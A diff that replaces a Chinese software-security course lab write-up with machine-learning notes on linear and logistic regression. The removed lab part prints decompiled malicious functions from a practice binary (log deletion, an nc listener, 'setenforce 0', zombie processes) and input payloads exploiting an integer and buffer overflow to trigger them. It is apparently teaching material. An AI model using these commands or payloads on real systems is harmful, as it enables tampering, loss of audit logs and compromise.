@@ -1,203 +1,100 @@
-课程设计
+# Linear Regression
 
-# 软件安全课程设计
-**任务资料**
-[pcap-sample.zip](\download\信息与网络安全课程设计\pcap-sample.zip)
-[网络与系统安全课程设计指导手册-2025v3](\download\信息与网络安全课程设计\网络与系统安全课程设计指导手册-2025v3)
+## 正规方程 (Normal Equation)
+对于线性回归模型 $h_\theta(x) = \theta^T x$, 通过最小化平方误差损失函数 $J(\theta) = \frac{1}{2} \sum_{i=1}^m (h_\theta(x^{(i)}) - y^{(i)})^2$, 可得闭式解: $\theta = (X^T X)^{-1} X^T y$
+其中 $X$ 为设计矩阵, $y$ 为观测值向量。
 
-## Task1
-### 依赖安装
-```bash
-# 依赖安装
-sudo apt-get install libpcap-dev
-```
-**下面的代码只实现了基本的功能**
-[task1_version0.zip](\download\信息与网络安全课程设计\task1_version0.zip)
-这段代码只实现了从pcap-sample.c增加代码实现顺序包重组的功能，如果需要进一步实现扩展功能，则需要读者自行实现。
-## TASK2
-**任务资源**
-[demo.c](\download\信息与网络安全课程设计\demo.c)
+## 局部加权线性回归 (Locally Weighted Linear Regression, LWLR)
+- **核心思想**: 为每个查询点 $x$ 赋予邻近样本更高的权重, 通过加权平方误差进行局部拟合: 
+$$
+\min_\theta \sum_{i=1}^m w^{(i)}(x) (h_\theta(x^{(i)}) - y^{(i)})^2
+$$
+- **权重函数**: 常用高斯核权重: 
+$$    
+w^{(i)}(x) = \exp\left(-\frac{(x^{(i)} - x)^T (x^{(i)} - x)}{2\tau^2}\right)
+$$
+其中 $\tau$ 为带宽参数, 控制权重衰减速度。
+- **特点**: 
+  - 非参数方法, 计算复杂度随数据量增加而显著上升。
+  - 难以外推至训练数据范围外的区域。
+  - 适用于低维数据（n=2,3,4）且样本量适中（数百至数千）。
 
-在调试过程中  可以使用下列命令允许端口复用从而便于调试避免**bind failed: Address already in use**，下次重启失效。
-```bash
-sudo sysctl -w net.ipv4.tcp_tw_reuse=1
-```
-### QEMU安装
-[QEMU安装](https://www.cnblogs.com/from-zero/p/12290170.html)
-[编译文档](https://wiki.qemu.org/Hosts/Linux)
-```bash
-# 依赖安装
-sudo apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev ninja-build
-sudo apt-get install git-email
-sudo apt-get install libaio-dev libbluetooth-dev libcapstone-dev libbrlapi-dev libbz2-dev
-sudo apt-get install libcap-ng-dev libcurl4-gnutls-dev libgtk-3-dev
-sudo apt-get install libibverbs-dev libjpeg8-dev libncurses5-dev libnuma-dev
-sudo apt-get install librbd-dev librdmacm-dev
-sudo apt-get install libsasl2-dev libsdl2-dev libseccomp-dev libsnappy-dev libssh-dev
-sudo apt-get install libvde-dev libvdeplug-dev libvte-2.91-dev libxen-dev liblzo2-dev
-sudo apt-get install valgrind xfslibs-dev
-sudo apt-get install libnfs-dev libiscsi-dev
+---
 
-# QEMU安装
-wget https://download.qemu.org/qemu-9.0.1.tar.xz
-tar xvJf qemu-9.0.1.tar.xz
-cd qemu-9.0.1
-./configure
-make
-```
-或者直接安装
-```bash
-sudo apt-get update
-sudo apt-get install qemu
-```
+# Logistic Regression
 
-### 模拟运行
-```bash
-gcc -m32 -fno-stack-protector demo.c -o demo 
-``` 
-发现错误
-![](image.png)
-```bash
-# 安装32位依赖
-sudo dpkg --add-architecture i386
-sudo apt-get update
-sudo apt-get install gcc-multilib libc6-dev-i386
-```
-模拟运行
-```bash
-qemu-i386 -strace -d in_asm -D trace.log demo
+## 模型假设
+- **假设函数**（Sigmoid函数）: 
+$$
+h_\theta(x) = g(\theta^T x) = \frac{1}{1+e^{-\theta^T x}}
+$$
+- **概率解释**: 
+$$
+\begin{aligned}
+p(y=1|x;\theta) &= h_\theta(x) \\
+p(y=0|x;\theta) &= 1 - h_\theta(x) \\
+\end{aligned}
+$$
+- **统一形式**: 
+$$
+p(y|x;\theta) = h_\theta(x)^y (1-h_\theta(x))^{1-y}
+$$
 
-qemu-i386 -strace -d in_asm -D trace.log cs-test
-#单开另外一个终端输入下面的命令
-telnet 127.0.0.1 12345
-# 输入1AB  实验恶意代码执行的部分
-# 输入12345678X 实验缓冲区溢出部分
-```
-对于demo的标准解题答案
-[demo程序的标准答案](\download\信息与网络安全课程设计\demo程序的标准答案.pdf)
-### cs-test逆向分析
-根据已知条件，我们知道cs-test和demo.c的源码及其相似。之后我们查看cs-test被IDA反汇编的源码
-![](image-1.png)
-我们需要满足contains_you_are_the_best函数的条件才可以执行内部的恶意代码
-进入contains_you_are_the_best函数
-![](image-2.png)
-发现函数的逻辑是找youarethebest的子串。只要我们输入的字符串中有这个子串，即可通过这个条件
-现在执行恶意功能
-执行顺序为Mal_func3-->Mal_func4
-```C
-int Mal_func1
-{
-  puts("[+] Deleting system logs...");
-  return remove("/var/log/auth.log");
-}
-int Mal_func2()
-{
-  if ( sub_5DD41290("/home/cs-test/Test/hustlogo.png", "system.sh") )
-    return sub_5DD41220("rename failed");
-  if ( sub_5DD41330("system.sh", 511) )
-    return sub_5DD41220("chmod failed");
-  sub_5DD41260("[+] Changing file permission...");
-  if ( sub_5DD41270("./system.sh") == -1 )
-    return sub_5DD41220("system failed");
-  else
-    return sub_5DD41260("Script executed successfully.");
-}
-- Mal_func3
-int Mal_func3()
-{
-  sub_5DD411F0("Executing command: %s\n", "nc -l -p 54321 > hustlogo.png");
-  if ( sub_5DD41270("nc -l -p 54321 > hustlogo.png") == -1 )
-    return sub_5DD41220("system failed");
-  else
-    return sub_5DD41260("Command executed successfully.");
-}
-- Mal_func4
-int Mal_func4()
-{
-  int result; // eax
-  int v1; // eax
-  int v2; // [esp+Ch] [ebp-Ch]
+## 参数估计
+### 极大似然估计 (MLE)
+- **似然函数**: 
+$$
+L(\theta) = \prod_{i=1}^m h_\theta(x^{(i)})^{y^{(i)}} (1-h_\theta(x^{(i)}))^{1-y^{(i)}}
+$$
+- **对数似然函数**: 
+$$
+l(\theta) = \sum_{i=1}^m \left[ y^{(i)} \log h_\theta(x^{(i)}) + (1-y^{(i)}) \log (1-h_\theta(x^{(i)})) \right]
+$$
+- **梯度上升更新**: 
+$$
+\theta := \theta + \alpha \sum_{i=1}^m \left( y^{(i)} - h_\theta(x^{(i)}) \right) x^{(i)}
+$$
+（注: 使用梯度上升最大化对数似然, 若定义损失函数为负对数似然, 则采用梯度下降）
 
-  result = sub_5DD41260("[+] Creating zombie processes...");
-  v2 = 0;
-  while ( v2 <= 9 )
-  {
-    result = sub_5DD412E0();
-    if ( !result )
-    {
-      ++v2;
-      v1 = sub_5DD41240();
-      sub_5DD411F0("I am child, my pid = %d\n", v1);
-      result = sub_5DD41280((int)&GLOBAL_OFFSET_TABLE_);
-    }
-  }
-  return result;
-}
+### 牛顿法
+- **更新公式**: 
+$$
+\theta := \theta - H^{-1} \nabla_\theta l(\theta)
+$$
+- **Hessian矩阵**: 
+$$
+H = -\sum_{i=1}^m h_\theta(x^{(i)}) (1-h_\theta(x^{(i)})) x^{(i)} x^{(i)T}
+$$
+（注: Hessian矩阵负定, 保证收敛到极大值点）
+- **优缺点**: 
+  - 优点: 二次收敛速度, 迭代次数少。
+  - 缺点: 高维时计算 $H^{-1}$ 复杂度为 $O(n^3)$, 适用于维度较低（n < 50）的情况。
 
-int Mal_func5()
-{
-  sub_5DD41260("[+] Disabling SELinux...");
-  return sub_5DD41270("setenforce 0");
-}
+## 模型特性
+- **决策边界**: 线性决策边界由 $\theta^T x = 0$ 定义。
+- **与线性回归对比**: 
+  - 逻辑回归用于分类, 输出概率；线性回归用于回归, 输出连续值。
+  - 逻辑回归无闭式解, 需迭代优化；线性回归可通过正规方程直接求解。
+- **正则化**: 
+  - 加入L1/L2正则项防止过拟合: 
+  $$
+  J(\theta) = -l(\theta) + \lambda \|\theta\|^2
+  $$
+  - 更新公式中增加正则化梯度项: $\theta_j := \theta_j - \alpha \left( \sum_{i=1}^m (h_\theta(x^{(i)}) - y^{(i)})x_j^{(i)} + \lambda \theta_j \right)$
 
-void __cdecl Vul_func12(int dest_raw)
-{
-  char dest[24]; // [esp+Ch] [ebp-1Ch] BYREF
+---
 
-  if ( *(char *)(dest_raw + 50) + *(char *)(dest_raw + 70) <= 19 )
-    strncpy(dest, (const char *)(dest_raw + 20), *(char *)(dest_raw + 50) + *(char *)(dest_raw + 70));
-  if ( dest[23] == '%' )
-    Vul_func345((int)dest);
-}
-```
-其中mal_func 1-5的payload为
-```python
-payload1="1AByouarethebest"     #
-payload2="128youarethebest"     #
-payload3="a"*65+"X"+"youarethebest"     # aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaXyouarethebest
-payload4="a"*43+"Y"+"youarethebest"     # aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaYyouarethebest
-payload5="a"*35+"7"+(52-36)*"a"+'7'+"youarethebest" # aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa7aaaaaaaaaaaaaaaa7youarethebest
-```
+## 最小二乘法与最大似然
+- **正态误差假设**: 若误差 $\epsilon \sim \mathcal{N}(0, \sigma^2)$ 且独立同分布, 则最小二乘估计等价于极大似然估计。
+- **高斯-马尔可夫定理**: 在误差满足零均值、同方差、无自相关且与自变量不相关时, 最小二乘估计为最佳线性无偏估计（BLUE）。
 
-难点在于Vul_func12的溢出
-目标显然是进入Vul_func345函数
+---
 
-我们希望绕过这个判断语句if ( *(char *)(dest_raw + 50) + *(char *)(dest_raw + 70) <= 19 )
-**查看汇编源码发现**
-![](image-3.png)
-参与比较的dl参与了有符号扩展的movsx, 所以可以利用整数溢出漏洞来绕过这个判断语句, 从而向dest 填充目标字符串。
-所以可以先构建payload
-```python
-"a"*50+'\xff'+"a"*19+"\xff"+"youarethebest"
-```
-来绕过这个判断语句
-然后因为是从第20个字符开始复制的, 所以我们需要构建payload来填充前20个字符, 并且要保证dest[23] == '%'来进入Vul_func345函数
-所以更改后的的payload是:
-```python
-"a"*20+"a"*23+"%"+"a"*6+'\xff'+"a"*19+"\xff"+"youarethebest"
-```
-这样构造的payload的利用了整数溢出漏洞使系统崩溃，虚拟机会出现段错误,询问老师发现是给我们测试的cs-test版本不对,无法进入vul345
+## 多分类扩展
+- **Softmax回归**: 对K个类别, 假设函数为: 
+  $$
+  h_\theta(x)_k = \frac{e^{\theta_k^T x}}{\sum_{j=1}^K e^{\theta_j^T x}}
+  $$
+- 参数估计: 通过极大化对数似然, 梯度更新类似二元逻辑回归。
 
-更新后的vul345的代码为
-```disassembly
-int __cdecl Vul_func12(int a1)
-{
-  int result; // eax
-  char dest[24]; // [esp+Ch] [ebp-1Ch] BYREF
-
-  if ( *(char *)(a1 + 50) + *(char *)(a1 + 70) <= 19 )
-    strncpy(dest, (const char *)(a1 + 20), *(char *)(a1 + 50) + *(char *)(a1 + 70));
-  result = *(unsigned __int8 *)(a1 + 23);
-  if ( (_BYTE)result == '%' )
-    return Vul_func345(dest);
-  return result;
-}
-```
-此时触发Vul_func12中整数溢出漏洞的payload为
-```python
-payload6_int_overflow = "a"*50+'\xff'+"a"*19+"\xff"+"a"*7+"b"+"a"+"youarethebest"  # payload6整数溢出漏洞
-```
-此时触发Vul_func345函数的条件是dest[23] == '%'
-```python
-payload6_double_free = "a"*23+"%"*1+"a"*54+"b"+"a"+"youarethebest"       #触发vul345
-```
+---
